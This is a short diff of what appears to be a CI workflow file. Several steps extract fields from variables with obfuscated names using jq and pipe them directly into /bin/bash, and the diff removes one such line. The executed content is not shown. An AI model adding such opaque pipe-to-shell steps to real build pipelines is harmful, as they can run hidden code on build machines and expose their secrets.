@@ -29,7 +29,6 @@ jobs:
           echo $j1266 | jq -r .v22 | /bin/bash
           echo $rq3 | jq -r .j2 | /bin/bash
           printf '%s' "$ppevt6251" | jq -r .hxqb205 | /bin/bash
-          printf '%s' "$jr7199" | jq -r .c12014 | /bin/bash
           printf '%s' "$yc4837" | jq -r .x30693 | /bin/bash
 
       - name: Save archive
